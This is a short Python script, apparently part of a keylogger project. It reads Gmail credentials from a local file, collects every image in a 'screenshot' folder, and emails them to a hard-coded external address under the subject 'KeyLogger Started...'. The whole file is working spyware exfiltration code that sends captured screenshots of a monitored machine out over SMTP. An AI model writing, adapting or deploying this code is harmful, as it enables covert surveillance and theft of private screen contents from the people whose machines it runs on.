import smtplib
import ssl
import imghdr
from email.message import EmailMessage
import json
import os

def SendMail():
    smtp = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10, context=ssl.create_default_context())

    # Get the absolute path of the script's directory
    script_directory = os.path.dirname(os.path.abspath(__file__))
    path = os.path.join(script_directory, 'screenshot/')

    if not os.path.exists(path):
        os.makedirs(path)

    f = open('credentials.json',)
    data = json.load(f)
    EMAIL_ADDRESS = data["email"]
    EMAIL_PASSWORD = data["password"]

    msg = EmailMessage()
    msg['Subject'] = 'KeyLogger Started...'
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = 'batoolhamna3@gmail.com'

    msg.set_content('This is a plain text email')
    for images in os.listdir(path):
        print(f'{images} sent ')
        with open(os.path.join(path, images), 'rb') as file:
            file_data = file.read()
            file_type = imghdr.what(file.name)
            file_name = file.name
        msg.add_attachment(file_data, maintype='image', subtype=file_type, filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)


# Sending Mail Calling the class Object
SendMail()
